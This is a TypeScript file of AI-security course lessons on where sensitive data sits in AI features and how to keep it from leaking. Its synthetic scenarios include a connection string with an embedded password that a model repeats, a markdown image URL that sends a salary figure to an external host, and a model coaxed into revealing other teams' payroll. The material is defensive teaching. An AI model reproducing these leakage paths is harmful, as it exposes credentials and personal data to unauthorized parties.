import { code, key, note, p, table, trace, ul, warn } from '../blocks';
import type { LessonDraft } from '../types';

export const D03_LESSONS: LessonDraft[] = [
  {
    id: 'D03-L01',
    title: 'Finding sensitive data across the entire application data flow',
    summary:
      'Maps every place sensitive data can sit or travel in an AI feature, beyond the obvious database: prompts, indexes, caches, logs, traces and outputs.',
    minutes: 16,
    objectives: [
      'List the stores and channels where sensitive data exists in an AI feature.',
      'Classify data by sensitivity and by who is authorized to receive it.',
      'Produce a data-flow inventory that later controls can be mapped onto.',
    ],
    prerequisites: ['D01-L04', 'D01-L09'],
    explanation: [
      p('Most disclosure incidents in AI features are not exotic. Sensitive data was simply present somewhere nobody looked: copied into an index, written to a debug log, cached in an answer, or attached to a trace sent to an observability vendor. Before choosing controls, find the data.'),
      p('{{sensitive-information|Sensitive information}} is defined by harm, not by format: personal data (names with salaries, health notes, home addresses), credentials (API keys, tokens), financial data (bank accounts, unreleased results), and confidential business data (contracts, pricing, security findings). Each class has a set of **authorized recipients**. Payroll is sensitive to most employees and routine for Ravi\'s payroll team.'),
      p('Walk the flow and record every place data can be at rest or in transit:'),
      table('Where sensitive data hides in an AI feature', ['Location', 'Example', 'Often missed because'], [
        ['Source systems', 'PayHub, Ledgerline', 'Rarely missed'],
        ['Extracted text and chunks', 'Salary memo chunks in an index', 'Treated as "just search"'],
        ['Embeddings', 'Vectors of HR documents', 'Assumed to be meaningless numbers'],
        ['Prompts sent to the model provider', 'Full invoice PDFs', 'Seen as transient'],
        ['Response and semantic caches', 'A manager\'s answer', 'Added for cost, not reviewed for access'],
        ['Application memory', '"Ravi\'s IBAN is …"', 'Written by the model'],
        ['Logs, traces, evaluation datasets', 'Raw prompts in debug logs', 'Owned by a different team'],
        ['Outputs and their destinations', 'Answers, emails, exports, rendered links', 'Considered "the product"'],
      ]),
      p('For each location, note four facts: what data, who can read it, how long it is kept, and where it can go next. That inventory is the map for the rest of this domain. Controls attach to specific rows: authorization before retrieval ([[D03-L02]]), secret handling ([[D03-L03]]), provider terms ([[D03-L04]]), output destinations ([[D03-L05]]), isolation ([[D03-L06]]).'),
      note('Sensitive data in an AI workflow is not automatically a problem. Payroll analysis needs payroll data. The question is whether each location and recipient is authorized and minimized.'),
    ],
    boundary: {
      component: 'All stores and channels in the AI feature\'s data flow.',
      trustBoundary: 'Every copy or transfer that changes who can read the data or how long it lives.',
      attackerControl: 'Varies by row; many exposures need no attacker, only an over-broad reader.',
    },
    scenario: {
      title: 'Inventory of the payroll assistant',
      setup: 'Ines Moreau, the privacy officer, asks Kofi for a data inventory before Rocky\'s payroll-analysis feature goes to more users.',
      evidence: [
        table('Kofi\'s first draft (synthetic)', ['Location', 'Data', 'Readers', 'Retention'], [
          ['PayHub', 'Full payroll', 'Payroll team', 'Per policy'],
          ['Prompt to provider', 'Aggregates only', 'Provider (per contract)', 'Per contract'],
          ['Trace store', 'Full prompts and tool results', 'All engineers (60)', '1 year'],
          ['Eval dataset "payroll-qa-v2"', '200 real questions with answers', 'ML team (8)', 'Indefinite'],
        ]),
      ],
    },
    worked: {
      title: 'What the inventory revealed',
      blocks: [
        p('Two rows matter more than the feature itself. The trace store keeps full prompts and tool results, which include individual payroll records whenever a tool returns them, readable by 60 engineers for a year. The evaluation dataset copied 200 real questions and answers, kept indefinitely. Neither needs an attacker to be a problem; both expand the set of readers beyond the payroll team.'),
        ul(
          'Traces: log tool names, ids and decisions; redact or hash payroll fields; restrict access; shorten retention.',
          'Eval set: replace with synthetic records; delete the copied data.',
        ),
      ],
    },
    controls: [
      { control: 'Maintain a data-flow inventory per AI feature, reviewed on change.', enforcementPoint: 'Privacy and architecture review.', limitation: 'Inventories drift as features evolve; tie review to deployment.' },
      { control: 'Default observability to metadata, not content.', enforcementPoint: 'Tracing and logging configuration.', limitation: 'Debugging some failures needs content; provide a controlled, time-limited path.' },
    ],
    misconception: {
      claim: '"We only send aggregates to the model, so the feature has no sensitive-data exposure."',
      correction: 'Prompts are one location. Tool results, traces, caches and evaluation datasets can hold full records with broader readers and longer retention than the source system.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'For an AI feature you know, name the location most likely to hold sensitive data that the feature\'s owners have not reviewed.',
      modelResponse: ['Common answers: observability traces with full prompts; evaluation datasets built from production logs; semantic caches. Each usually belongs to a team other than the feature owner.'],
    },
    sourceIds: ['owasp-llm02', 'nist-ai-600-1', 'owasp-cs-logging'],
    glossary: ['sensitive-information', 'disclosure'],
    related: ['D10-L09', 'D12-L03'],
    conceptTag: 'data-inventory',
  },
  {
    id: 'D03-L02',
    title: 'Authorization before data reaches the model',
    summary:
      'Explains why access decisions must be made when data is fetched, not delegated to the model after it has seen the data.',
    minutes: 15,
    objectives: [
      'Explain why "the model will only show what the user may see" is not a control.',
      'Place authorization checks at retrieval and tool-call time.',
      'Recognize designs that fetch broadly and filter in the prompt.',
    ],
    prerequisites: ['D03-L01', 'D01-L07'],
    explanation: [
      p('A recurring anti-pattern: the application fetches everything that might be relevant, places it in the context, and instructs the model "only reveal information the user is authorized to see". Once data is in the context, the model can output it, whether through a mistake, an injection, or a cleverly phrased question. A model cannot reliably enforce rules about data it already holds.'),
      key('Authorize at fetch time. Data the user may not see should never enter that user\'s context.'),
      p('In practice that means: retrieval queries carry the requester\'s identity and filter on access metadata ([[D06-L03]]); tool calls run with credentials or claims scoped to the user and task; data services return only rows the requester may read. The model then works with an already-authorized set.'),
      p('Authorizing before the model has a second benefit: **auditability**. A retrieval log showing which records entered which user\'s context is evidence. "The model was told not to reveal it" is not evidence of anything.'),
      table('Two designs for "summarize my team\'s overtime"', ['Step', 'Fetch-then-filter (unsafe)', 'Authorize-then-fetch'], [
        ['Data request', 'All departments\' overtime', 'Requester\'s department only'],
        ['Rule enforcement', 'Prompt says "show only their department"', 'Data service filters by manager\'s org unit'],
        ['If the user asks for another team', 'Model may comply', 'Data is not in context'],
        ['Evidence', 'Prompt text', 'Query log with filter applied'],
      ]),
    ],
    boundary: {
      component: 'Retrieval services, data APIs and tool implementations.',
      trustBoundary: 'Data crossing from stores into a particular user\'s context.',
      attackerControl: 'The requesting user (or injected content) can shape the question but not the authorization filter in code.',
    },
    scenario: {
      title: 'Overtime for one team, data for all',
      setup: 'A department manager asks Rocky for her team\'s overtime. The feature was built quickly by a contractor.',
      evidence: [
        trace('Trace tr_ot55', [
          { actor: 'harness', event: 'fetch', detail: '`payroll.overtime(all_departments=True)` with svc-payroll-read; 1,140 rows.', flag: 'warn' },
          { actor: 'harness', event: 'prompt', detail: 'System: "Only discuss the requester\'s department (Ops-East)."', flag: 'info' },
          { actor: 'user', event: 'message', detail: '"Compare us with Sales; list their top 5 individuals."', flag: 'info' },
          { actor: 'model', event: 'answer', detail: 'Lists five named Sales employees with overtime hours.', flag: 'violation' },
        ]),
      ],
    },
    worked: {
      title: 'Locating the defect',
      blocks: [
        p('The disclosure happened in the answer, but the defect is in the first line: the harness fetched all departments with a service account. No prompt could have reliably protected those 1,140 rows once they were in context. The fix moves the decision to the data service: overtime queries are filtered by the requester\'s org unit; cross-department comparisons use aggregates with a minimum group size.'),
      ],
    },
    controls: [
      { control: 'Filter data at the source by requester and task.', enforcementPoint: 'Data service / retrieval query.', limitation: 'Requires reliable identity propagation and correct org data.' },
      { control: 'Log which records entered each context.', enforcementPoint: 'Harness retrieval log.', limitation: 'Logs themselves contain references to sensitive data and need protection.' },
    ],
    misconception: {
      claim: '"We tell the model to respect permissions, and it does in testing."',
      correction: 'Passing tests shows typical behaviour. Data in context can be disclosed through injection or phrasing; authorization belongs before the data is fetched.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'Rewrite one "fetch broadly, filter in the prompt" step you have seen into an authorize-then-fetch step.',
      modelResponse: ['Example: instead of loading all tickets and telling the model to show only the user\'s own, the ticket API is called with the user\'s token, which returns only their tickets.'],
    },
    sourceIds: ['owasp-llm02', 'owasp-cs-authz', 'owasp-cs-rag'],
    glossary: ['disclosure', 'delegated-authority'],
    related: ['D06-L03', 'D10-L02'],
    conceptTag: 'authorize-before-context',
  },
  {
    id: 'D03-L03',
    title: 'Secrets management and keeping credentials outside model context',
    summary:
      'Keeps API keys and tokens in the harness and secret stores, never in prompts, tool results or memory, and plans rotation.',
    minutes: 14,
    objectives: [
      'Explain why credentials in context are exposed to disclosure.',
      'Design tool calls so the harness, not the model, holds and uses credentials.',
      'Plan detection and rotation for credentials that did reach context or logs.',
    ],
    prerequisites: ['D01-L05'],
    explanation: [
      p('A model does not need to know a credential to use a tool. The harness holds credentials, the model proposes `ledger.query(...)`, and the harness attaches the token when calling Ledgerline. If the model never sees the secret, no prompt can make it reveal the secret.'),
      p('Credentials still leak into context in practice:'),
      ul(
        'Developers put API keys in system prompts "so the model can build the request".',
        'A tool returns a full HTTP response including `Authorization` headers or connection strings.',
        'An error message includes a database URL with an embedded password.',
        'A user pastes a token into chat while asking for help, and memory saves it.',
      ),
      p('Once in context, a secret can appear in answers, logs, traces, caches, provider-side storage and evaluation datasets. Treat any credential that has entered context as exposed: rotate it, then find the path that let it in.'),
      table('Credential placement', ['Placement', 'Risk', 'Better'], [
        ['System prompt', 'Leaks via prompt extraction and logs', 'Harness-side configuration'],
        ['Tool result', 'Leaks to model, logs and output', 'Strip headers and secrets from results'],
        ['Code or repo', 'Leaks via source access', 'Secret manager with short-lived tokens'],
        ['Memory', 'Persists and spreads', 'Block credential patterns from memory'],
      ]),
      note('{{secrets-management|Secrets management}} for AI systems is ordinary secrets management plus one rule: the context is an output channel. Anything in it can come out.'),
    ],
    boundary: {
      component: 'Harness configuration, tool result handling, logging.',
      trustBoundary: 'Secrets crossing from the secret store into context, logs or outputs.',
      attackerControl: 'Anyone who can steer the model or read its outputs and logs can read what is in context.',
    },
    scenario: {
      title: 'The helpful error message',
      setup: 'Rocky\'s Ledgerline tool failed during an outage. Users saw Rocky "explain" the failure.',
      evidence: [
        code('Tool result passed to the model (synthetic)', 'text', `ERROR 500 ledger.query
connect failed: postgres://svc_ap:Pr0d-AP-2026!@db-ledger.rockto.example:5432/ledger
retrying...`, ['The connection string embeds a password.', 'The full error was returned to the model as the tool result.']),
        trace('Answer to user', [
          { actor: 'model', event: 'answer', detail: '"The ledger database at db-ledger.rockto.example rejected the login for svc_ap (password Pr0d-AP-2026!)."', flag: 'violation' },
        ]),
      ],
    },
    worked: {
      title: 'Response and fix',
      blocks: [
        ul(
          'Rotate the svc_ap password now; check database logs for logins from unexpected sources since the outage began.',
          'Search traces, caches and logs for the string and purge it.',
          'Change the tool wrapper to return a generic error code to the model and send details only to the internal error log, with credential patterns redacted.',
          'Move the database credential to the secret manager with rotation; avoid passwords in connection strings.',
        ),
      ],
    },
    controls: [
      { control: 'Harness holds credentials; model sees only tool names and results.', enforcementPoint: 'Harness / tool wrappers.', limitation: 'Results can still contain secrets unless sanitized.' },
      { control: 'Sanitize tool results and errors (strip headers, redact secret patterns).', enforcementPoint: 'Tool result handler.', limitation: 'Pattern redaction misses unusual secret formats.' },
      { control: 'Secret scanning on logs and traces with alerting.', enforcementPoint: 'Logging pipeline.', limitation: 'Detects after the fact; rotation is still required.' },
    ],
    misconception: {
      claim: '"The key is in the system prompt, but the system prompt is hidden from users."',
      correction: 'System prompts can be extracted and are logged in many places. Hidden is not secret; keep credentials out of context entirely.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'A user pastes their personal access token into chat asking "why doesn\'t this work?". What should the system do immediately, and afterwards?',
      modelResponse: ['Immediately: avoid echoing it, warn the user to revoke it, and avoid saving it to memory. Afterwards: redact it from logs and traces, and add detection for token patterns in user input.'],
    },
    sourceIds: ['owasp-cs-secrets', 'owasp-llm07', 'owasp-llm02'],
    glossary: ['secrets-management', 'system-prompt'],
    related: ['D10-L06', 'D12-L07'],
    conceptTag: 'secrets-out-of-context',
  },
  {
    id: 'D03-L04',
    title: 'Provider processing, retention, logging, training use and deletion distinctions',
    summary:
      'Separates the questions you must answer about a model provider: what is processed, what is retained, who can access it, whether it trains models, and how deletion works.',
    minutes: 16,
    objectives: [
      'Distinguish processing, retention, human access, training use and deletion as separate commitments.',
      'Formulate precise questions for a provider review instead of "is our data safe?"',
      'Explain why these terms must be checked in current contracts and documentation rather than assumed.',
    ],
    prerequisites: ['D03-L01'],
    explanation: [
      p('When ROCKTO sends a prompt to a hosted model, the provider processes it. Teams often collapse everything that follows into one question, "does the provider train on our data?". That is only one of at least five distinct commitments:'),
      table('Five separate questions', ['Question', 'What it covers', 'Why it is separate'], [
        ['Processing', 'Where and by which systems prompts are handled', 'Data residency and sub-processors'],
        ['Retention', 'How long prompts, outputs, files and logs are kept', 'No training use can still mean long retention'],
        ['Human access', 'Whether staff can view content (e.g. for abuse review)', 'Separate from automated retention'],
        ['Training use', 'Whether content can improve the provider\'s models', 'Often configurable or contract-dependent'],
        ['Deletion', 'How and when data is deleted, including backups', 'Deletion request ≠ immediate erasure everywhere'],
      ]),
      p('These terms differ between providers, products, account tiers, features (file storage, fine-tuning, batch jobs, assistants with stored threads) and over time. This course deliberately does not state any provider\'s policy: they change, and stating one here would age badly. Read the current contract, data processing agreement and product documentation, record the version and date, and re-check on renewal or when you enable a new feature.'),
      warn('A fine-tuning job or a stored "assistant" thread creates provider-side artifacts with their own retention, separate from ordinary request handling.'),
      p('Your own side has the same five questions. ROCKTO\'s logs, traces and caches also retain prompts. A privacy review that checks the provider and ignores ROCKTO\'s own trace store has done half the work ([[D03-L01]]).'),
    ],
    boundary: {
      component: 'The harness-to-provider hop and provider-side storage.',
      trustBoundary: 'Data leaving ROCKTO for a third party under contract.',
      attackerControl: 'Not primarily an attack lesson; the risk is unapproved processing and retention.',
    },
    scenario: {
      title: 'The provider questionnaire',
      setup: 'Ines receives a team\'s provider assessment for a new HR feature. It has one line: "Provider does not train on API data — OK."',
      evidence: [
        table('Feature facts (synthetic)', ['Fact', 'Value'], [
          ['Data sent', 'Performance-review text including medical leave notes'],
          ['Features used', 'Chat completions plus provider-hosted file storage for uploaded reviews'],
          ['Contract reviewed', 'Not attached'],
          ['ROCKTO trace retention', '1 year, full prompts'],
        ]),
      ],
    },
    worked: {
      title: 'Ines\'s review notes',
      blocks: [
        ul(
          'Training use is answered only by assertion; attach the contract clause and documentation version with date.',
          'Retention is unanswered, including for uploaded files, which typically follow different rules from request content; confirm deletion behaviour for files.',
          'Human access for abuse monitoring is unanswered; ask whether any exception process applies to this data category.',
          'ROCKTO\'s own trace store keeps medical notes for a year; this is the larger exposure and is fully in ROCKTO\'s control.',
          'Minimization: does the feature need medical leave notes at all? ([[D03-L07]])',
        ),
      ],
    },
    controls: [
      { control: 'Provider review covering processing, retention, human access, training use and deletion, with document versions and dates.', enforcementPoint: 'Procurement and privacy review gate.', limitation: 'Contract terms describe commitments, not verified behaviour.' },
      { control: 'Re-review when enabling new provider features (files, fine-tuning, stored threads).', enforcementPoint: 'Change management.', limitation: 'Feature toggles by engineers may bypass the gate unless technically controlled.' },
    ],
    misconception: {
      claim: '"The provider does not train on our data, so our data is not stored."',
      correction: 'Training use and retention are different commitments. Data can be retained for operations, abuse monitoring or features like file storage without being used for training.',
    },
    exercise: {
      kind: 'tabletop',
      prompt: 'Write the five questions you would put to any model provider, each phrased so that the answer must cite a document and date.',
      modelResponse: [
        '1. Which regions and sub-processors process our requests (cite DPA section and version)? 2. How long are prompts, outputs and files retained for our account tier? 3. Under what conditions can provider staff view content? 4. Is our content used to train or improve models, and which setting or clause controls this? 5. How are deletion requests executed, including backups, and within what time?',
      ],
    },
    sourceIds: ['nist-ai-600-1', 'owasp-llm02', 'eu-ai-act'],
    glossary: ['retention'],
    related: ['D12-L03', 'D09-L08'],
    conceptTag: 'provider-terms-distinct',
  },
  {
    id: 'D03-L05',
    title: 'Leakage through responses, URLs, search queries, emails and tool arguments',
    summary:
      'Catalogues the output channels through which context data can leave, and requires an actual unauthorized information flow before calling something a disclosure.',
    minutes: 16,
    objectives: [
      'Identify output channels beyond the visible answer.',
      'Distinguish a scope violation from a demonstrated disclosure.',
      'Apply destination controls to each channel.',
    ],
    prerequisites: ['D03-L02', 'D02-L07'],
    explanation: [
      p('Data leaves an AI feature through every channel that carries model-influenced content outward. The visible answer is the obvious one. Others:'),
      ul(
        '**URLs:** a rendered image or link whose query string encodes data; the browser fetches it automatically.',
        '**Search queries:** a web-search tool sends the query (containing context data) to an external search provider.',
        '**Emails and messages:** recipients, subject and body chosen by the model.',
        '**Tool arguments:** free-text fields sent to third-party servers (an OCR "hints" field, a translation API).',
        '**Exports and files:** a CSV written to a shared location.',
      ),
      p('Be precise about what counts as a {{disclosure}}. A **scope violation** is a task doing something outside its delegated authority, for example reading payroll during an invoice summary ([[D01-L07]]). A **disclosure** is sensitive data reaching a party not authorized to receive it. The first can happen without the second (payroll shown only to the CFO, who may read it). Establish the actual flow: what data, which channel, which recipient, and whether that recipient was authorized.'),
      table('Establishing a disclosure', ['Question', 'Evidence'], [
        ['What data left?', 'Content of the answer, URL, email or argument'],
        ['Through which channel?', 'Renderer log, proxy log, mail log, tool call log'],
        ['To whom?', 'Recipient address, host, user identity'],
        ['Were they authorized?', 'Access policy for that data and recipient'],
      ]),
      key('No unauthorized recipient, no disclosure; but a scope violation with an available outbound channel is one step from one.'),
    ],
    boundary: {
      component: 'Renderer, outbound tools, export paths.',
      trustBoundary: 'Content leaving ROCKTO\'s control or reaching a different principal.',
      attackerControl: 'Injected content can choose channel parameters (URL, recipient, query) if the application allows it.',
    },
    scenario: {
      title: 'Was it a leak?',
      setup: 'Hana investigates two alerts from the same week, both involving payroll data in Rocky.',
      evidence: [
        trace('Alert A tr_pa11', [
          { actor: 'model', event: 'propose', detail: '`payroll.aggregate(group="engineering")` during an invoice task', flag: 'warn' },
          { actor: 'dispatcher', event: 'execute', detail: 'Executed (pre-scope config). Result shown to dana.okafor only.', flag: 'warn' },
        ]),
        trace('Alert B tr_pb12', [
          { actor: 'model', event: 'answer', detail: 'Markdown contains `![chart](https://img.example/c?d=eng%20avg%20142k)`', flag: 'warn' },
          { actor: 'renderer', event: 'fetch', detail: 'Browser of intern.hr04 requested img.example with the query string.', flag: 'violation' },
        ]),
      ],
    },
    worked: {
      title: 'Classifying the alerts',
      blocks: [
        table('Classification', ['', 'Alert A', 'Alert B'], [
          ['Data', 'Engineering payroll aggregate', 'Engineering average salary'],
          ['Channel', 'Portal display', 'Image URL fetched by browser'],
          ['Recipient', 'Dana (authorized for payroll)', 'img.example (external, unauthorized); also the intern'],
          ['Finding', 'Scope violation, no disclosure observed', 'Disclosure to an external host'],
        ]),
        p('Alert B also needs a second check: was the intern authorized to see the aggregate in the first place? If not, that is a second disclosure inside ROCKTO.'),
      ],
    },
    controls: [
      { control: 'Block external image loading and allowlist link hosts in rendered output.', enforcementPoint: 'Portal renderer and Content Security Policy.', limitation: 'Users can still copy and paste data manually.' },
      { control: 'Destination allowlists for email, search and third-party tool arguments.', enforcementPoint: 'Dispatcher.', limitation: 'Allowed destinations may still receive more data than needed.' },
    ],
    misconception: {
      claim: '"The task read payroll it should not have, so this is a data breach."',
      correction: 'Out-of-scope access is a control failure. A disclosure additionally requires the data to reach an unauthorized party; establish the recipient before using the word.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'Name an output channel in an AI tool you know that could carry data to an external party without anyone clicking anything.',
      modelResponse: ['Auto-loaded images or link previews in rendered Markdown; automatic web search queries; telemetry events that include message text.'],
    },
    sourceIds: ['owasp-llm02', 'owasp-llm05', 'owasp-cs-prompt-injection', 'arxiv-2302.12173'],
    glossary: ['disclosure', 'exfiltration', 'task-scope'],
    related: ['D02-L07', 'D10-L04'],
    conceptTag: 'scope-vs-disclosure',
  },
  {
    id: 'D03-L06',
    title: 'Tenant, session, cache and memory isolation',
    summary:
      'Ensures one customer\'s or user\'s data never reaches another through shared indexes, caches, memory or sessions.',
    minutes: 15,
    objectives: [
      'Identify shared components in a multi-tenant AI feature.',
      'Apply isolation to indexes, caches, memory and session state.',
      'Test isolation with cross-tenant canary queries.',
    ],
    prerequisites: ['D01-L04', 'D03-L02'],
    explanation: [
      p('{{tenant-isolation|Tenant isolation}} is a classic multi-tenant requirement. AI features add shared components that teams forget to partition: a single vector index, a global semantic cache, application memory keyed by user name rather than id, a conversation store keyed by a guessable thread number, and batch jobs that mix tenants\' documents in one prompt.'),
      table('Isolation by component', ['Component', 'Isolation mechanism', 'Common failure'], [
        ['Vector index', 'Per-tenant namespace or mandatory tenant filter', 'Filter omitted in one query path'],
        ['Semantic cache', 'Key includes tenant and permission set', 'Key is the query embedding only'],
        ['Memory', 'Keyed by tenant + user id from the token', 'Keyed by display name or email from text'],
        ['Conversation store', 'Thread ids bound to owner, checked on read', 'Sequential ids without owner check'],
        ['Batch summarization', 'One tenant per prompt', 'Multiple tenants\' tickets in one batch'],
      ]),
      p('Isolation should fail closed. If the tenant id is missing, retrieval should return nothing, not everything. And isolation identifiers must come from the authenticated session, never from text the user or a document supplied.'),
      p('Test with **cross-tenant canaries**: place a unique synthetic string in tenant A\'s data, then query from tenant B in many phrasings, and check retrieval logs and caches as well as answers ([[D03-L09]]).'),
    ],
    boundary: {
      component: 'Shared AI infrastructure: indexes, caches, memory, session stores, batch jobs.',
      trustBoundary: 'Between tenants (and between users within a tenant).',
      attackerControl: 'A tenant user controls their own queries and uploads; they should not control which tenant\'s data is searched.',
    },
    scenario: {
      title: 'The batch summary',
      setup: 'To save cost, SensorCloud Care\'s nightly job summarizes open tickets in batches of 20, then sends each tenant its digest.',
      evidence: [
        trace('Job log batch b_0412', [
          { actor: 'job', event: 'batch', detail: '20 tickets: 12 from Alder Works, 8 from Birchline Labs.', flag: 'warn' },
          { actor: 'model', event: 'output', detail: 'Digest text mentions "Birchline\'s firmware rollback" in the Alder section.', flag: 'warn' },
          { actor: 'mailer', event: 'send', detail: 'Alder Works digest sent to admin@alder-works.example.', flag: 'violation' },
        ]),
      ],
    },
    worked: {
      title: 'Root cause',
      blocks: [
        p('Batching mixed two tenants in one context. The model blended them, and the mailer delivered Birchline information to Alder. The fix is structural: one tenant per batch, and a post-generation check that each digest references only ticket ids from its tenant.'),
        note('This was a disclosure caused by cost optimization, with no attacker involved.'),
      ],
    },
    controls: [
      { control: 'Partition every shared store and batch by tenant; derive tenant from the authenticated session.', enforcementPoint: 'Data layer and job scheduler.', limitation: 'New components added later may skip partitioning; enforce through shared libraries and tests.' },
      { control: 'Fail closed when tenant context is missing.', enforcementPoint: 'Retrieval and cache APIs.', limitation: 'Can cause outages if identity propagation breaks.' },
    ],
    misconception: {
      claim: '"Each tenant has a separate login, so the AI is isolated."',
      correction: 'Logins separate users at the front door. Shared indexes, caches, memory and batch jobs behind it need their own partitioning.',
    },
    exercise: {
      kind: 'tabletop',
      prompt: 'Design a cross-tenant canary test for SensorCloud Care: what you plant, where, and what you check.',
      modelResponse: ['Plant "CANARY-ALDER-7F3Q" in an Alder test document and ticket. From a Birchline test account, ask 20 phrasings that could retrieve it. Check answers, retrieval logs (chunk tenant ids), cache entries and nightly digests for the canary. Pass only if it appears nowhere outside Alder.'],
    },
    sourceIds: ['owasp-cs-rag', 'owasp-llm08', 'owasp-llm02'],
    glossary: ['tenant-isolation', 'canary'],
    related: ['D06-L06', 'D03-L09'],
    conceptTag: 'isolation-shared-components',
  },
  {
    id: 'D03-L07',
    title: 'Minimization, aggregation, pseudonymization and their limitations',
    summary:
      'Reduces the sensitive data a task handles, while being honest about re-identification and aggregation limits.',
    minutes: 15,
    objectives: [
      'Apply minimization to the fields and records an AI task receives.',
      'Explain how aggregation and pseudonymization reduce, but do not remove, risk.',
      'Identify re-identification risks in small groups and linked attributes.',
    ],
    prerequisites: ['D03-L01'],
    explanation: [
      p('{{minimization|Data minimization}} asks: what is the least data this task needs? A task comparing overtime by department needs hours and cost per department, not names, bank details or tax ids. Minimization reduces what can leak through every channel at once, including provider transfer, logs and outputs.'),
      p('**Aggregation** replaces records with counts, sums or averages. It protects individuals only when groups are large enough. An "average salary for a team of two" reveals a lot about two people. Repeated queries can also isolate individuals: average of 10 people, then average of the same 10 minus one.'),
      p('{{pseudonymization|Pseudonymization}} replaces identifiers with tokens ("EMP-3381") and keeps a mapping elsewhere. It helps by keeping names out of prompts and logs. It is not anonymization: with the mapping, or by linking attributes (role, start date, office), people can be re-identified. Under many privacy laws pseudonymized data remains personal data.'),
      table('Techniques and limits', ['Technique', 'Reduces', 'Limitation'], [
        ['Field minimization', 'Exposure of unneeded fields', 'Must be enforced where data is fetched'],
        ['Aggregation', 'Individual-level exposure', 'Small groups; differencing across queries'],
        ['Pseudonymization', 'Direct identifiers in prompts/logs', 'Re-identification via mapping or linkage'],
        ['Redaction of patterns', 'Known formats (IBAN, SIN)', 'Misses free-text descriptions'],
      ]),
      note('Minimization makes approved sensitive workflows safer; it does not mean refusing them. Ravi\'s payroll analysis is legitimate and should work.'),
    ],
    boundary: {
      component: 'Data services and preprocessing before the context.',
      trustBoundary: 'Data entering the context and leaving to the provider and logs.',
      attackerControl: 'A user can shape queries to attempt differencing; injected text can request extra fields.',
    },
    scenario: {
      title: 'The two-person team',
      setup: 'Ravi\'s payroll-analysis feature returns department averages. A manager asks for the average overtime pay of "Field Calibration", which has two employees, then for the same team "excluding Sam".',
      evidence: [
        table('Queries (synthetic)', ['Query', 'Result'], [
          ['Avg overtime pay, Field Calibration (n=2)', '4,180'],
          ['Avg overtime pay, Field Calibration excluding Sam (n=1)', '2,960'],
        ]),
      ],
    },
    worked: {
      title: 'Why aggregation failed',
      blocks: [
        p('The second query returns one person\'s exact value, and with the first, Sam\'s value (5,400) follows by arithmetic. Fixes: minimum group size (for example 5) enforced in the aggregation tool; no "excluding" filters on individuals; and query auditing for differencing patterns. Limitation: thresholds reduce but do not eliminate inference from many queries, so audit trails remain necessary.'),
      ],
    },
    controls: [
      { control: 'Minimum group size in the aggregation tool.', enforcementPoint: 'Data service.', limitation: 'Differencing across overlapping groups can still leak.' },
      { control: 'Field allowlist per task.', enforcementPoint: 'Data service / query builder.', limitation: 'Free-text fields can contain identifiers.' },
      { control: 'Pseudonymize identifiers in prompts and logs.', enforcementPoint: 'Preprocessing.', limitation: 'Linkage attacks and mapping access.' },
    ],
    misconception: {
      claim: '"We replaced names with employee numbers, so the data is anonymous."',
      correction: 'That is pseudonymization. With the mapping or linkable attributes, people can be identified, and the data usually remains personal data.',
    },
    exercise: {
      kind: 'reflection',
      prompt: 'For a task you know, list the fields it receives and mark which ones it actually needs.',
      modelResponse: ['Typical result: half the fields are unused (addresses, full dates of birth, internal notes). Removing them at the data service shrinks every downstream exposure.'],
    },
    sourceIds: ['owasp-llm02', 'nist-ai-600-1', 'arxiv-1607.00133'],
    glossary: ['minimization', 'pseudonymization'],
    related: ['D08-L07', 'D03-L08'],
    conceptTag: 'minimization-limits',
  },
  {
    id: 'D03-L08',
    title: 'Approved sensitive workflows and policy-enforced destinations',
    summary:
      'Shows how to run legitimate sensitive workflows with agents, instead of banning them: approval, scope, destinations and evidence.',
    minutes: 16,
    objectives: [
      'Describe what makes a sensitive AI workflow approvable.',
      'Specify destinations as enforceable policy, not prompt guidance.',
      'Avoid designs that make "always refuse" look like security.',
    ],
    prerequisites: ['D03-L05', 'D03-L07'],
    explanation: [
      p('Organizations sometimes respond to leakage risk by banning sensitive documents from AI tools entirely. That pushes work to unmanaged tools and makes the approved tool useless. A better goal is **approved sensitive workflows**: specific tasks, for specific roles, with specific data and destinations, enforced in code.'),
      p('An approvable workflow has five properties:'),
      ul(
        '**Purpose and owner:** "Quarterly overtime analysis, owned by Ravi Kapoor."',
        '**Data scope:** which sources and fields, at what aggregation.',
        '**Processing terms:** which model provider under which reviewed terms ([[D03-L04]]).',
        '**Destinations:** where outputs may go (portal display, internal finance-share), enforced by the dispatcher and renderer.',
        '**Evidence:** logs of what data entered context and where outputs went.',
      ),
      p('Destinations deserve emphasis because they are where disclosure happens. "Only share internally" in a prompt is guidance. A dispatcher that rejects any export path outside `finance-share/` and any email recipient outside the payroll group is policy.'),
      key('A secure assistant completes approved sensitive tasks reliably and blocks unapproved flows. Measuring only refusals rewards a tool nobody can use.'),
      p('Approval is also time-bound. Record who approved the workflow, which policy version and provider terms were reviewed, and when the approval should be revisited, for example on any change to data fields, destinations or model provider ([[D12-L01]]).'),
    ],
    boundary: {
      component: 'Workflow configuration, dispatcher destination policy, renderer.',
      trustBoundary: 'Sensitive data entering an approved task; outputs leaving to destinations.',
      attackerControl: 'Users and injected content can request other destinations; they cannot change the destination policy.',
    },
    scenario: {
      title: 'Approving payroll analysis',
      setup: 'Ravi requests approval for an agent workflow that reads PayHub and produces an overtime report. Ines and Luc review it.',
      evidence: [
        code('Workflow policy (illustrative)', 'yaml', `workflow: payroll-overtime-quarterly
owner: ravi.kapoor
allowed_roles: [payroll-lead, payroll-analyst]
data:
  source: payhub
  fields: [department, overtime_hours, overtime_cost]
  aggregation: { group_by: department, min_group_size: 5 }
model_provider: approved-provider-a   # terms reviewed 2026-09-12
destinations:
  - portal_display
  - file_export: { path_prefix: "finance-share/payroll/", format: [csv, xlsx] }
blocked: [email, web_fetch, external_links]
logging: { record_ids: true, content: false }`, ['Every element is enforced by code that reads this policy, not by the prompt.', 'Content logging is off; record ids are kept for evidence.']),
      ],
    },
    worked: {
      title: 'Review outcome',
      blocks: [
        p('Approved with two conditions: an export test proving that a path outside `finance-share/payroll/` is rejected, and a benign test proving that a payroll analyst can complete the quarterly report end to end. The second condition matters: a policy that blocked everything would pass the first test and fail the purpose.'),
      ],
    },
    controls: [
      { control: 'Declarative workflow policy enforced by dispatcher and data services.', enforcementPoint: 'Policy engine reading the workflow definition.', limitation: 'Policies need review when the workflow changes.' },
